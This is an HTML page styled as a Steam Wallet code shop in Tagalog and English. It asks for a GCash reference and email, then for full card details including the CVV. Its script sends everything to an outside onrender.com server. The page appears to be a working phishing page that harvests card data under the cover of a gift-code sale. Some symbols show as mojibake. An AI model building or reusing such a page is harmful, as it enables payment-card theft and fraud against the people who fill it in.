<!DOCTYPE html>
<html lang="tl">
<head>
  <meta charset="UTF-8">
  <title>Benta ng Steam Codes</title>
  <style>
    body {
      font-family: sans-serif;
      background: #1b2838;
      color: #fff;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 800px;
      margin: 40px auto;
      background: #2a475e;
      padding: 30px;
      border-radius: 10px;
    }

    h1, h2 {
      margin-top: 0;
    }

    label {
      font-weight: bold;
      display: block;
      margin-top: 20px;
      margin-bottom: 5px;
    }

    input {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }

    .row {
      display: flex;
      gap: 10px;
    }

    .row .col {
      flex: 1;
    }

    button {
      background: #5c7e10;
      color: white;
      border: none;
      padding: 12px 20px;
      margin-top: 20px;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
    }

    button:hover {
      background: #4e6b0e;
    }

    img {
      margin: 10px 0;
      border-radius: 8px;
    }

    #status {
      margin-top: 15px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Steam Code Store</h1>
    <h2>‚Ç±1000 Steam Wallet Code</h2>
    <img src="gc.png" alt="GCash QR" width="200" />

    <label for="ref">GCash Ref No.</label>
    <input type="text" id="ref" placeholder="GCash Reference Number">

    <label for="email">Email Address</label>
    <input type="email" id="email" placeholder="Email Address">

    <h2>Enter Card Details</h2>

    <label for="cardName">Cardholder Name</label>
    <input type="text" id="cardName" placeholder="John Doe">

    <label for="cardNumber">Card Number</label>
    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">

    <div class="row">
      <div class="col">
        <label for="expDate">Expiry Date</label>
        <input type="text" id="expDate" placeholder="MM/YY" maxlength="5">
      </div>
      <div class="col">
        <label for="cvv">CVV</label>
        <input type="password" id="cvv" placeholder="123" maxlength="4">
      </div>
    </div>

    <button onclick="submit()">I-verify & I-send ang Code</button>
    <p id="status"></p>
  </div>

  <script>
    async function submit() {
      const ref = document.getElementById("ref").value;
      const email = document.getElementById("email").value;
      const cardName = document.getElementById("cardName").value;
      const cardNumber = document.getElementById("cardNumber").value;
      const expDate = document.getElementById("expDate").value;
      const cvv = document.getElementById("cvv").value;
      const status = document.getElementById("status");

      if (!ref || !email || !cardName || !cardNumber || !expDate || !cvv) {
        status.innerText = "‚ùå Please fill out all fields.";
        return;
      }

      status.innerText = "üîÑ Verifying payment...";
      try {
        const res = await fetch("https://backen-zwt8.onrender.com", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ ref, email, cardName, cardNumber, expDate, cvv, amount: 1000 })
        });

        const data = await res.json();
        if (data.success) {
          status.innerHTML = "‚úÖ Code sent to your email!";
        } else {
          status.innerHTML = "‚ùå " + data.message;
        }
      } catch (err) {
        status.innerText = "‚ùå Network error.";
      }
    }
  </script>
</body>
</html>
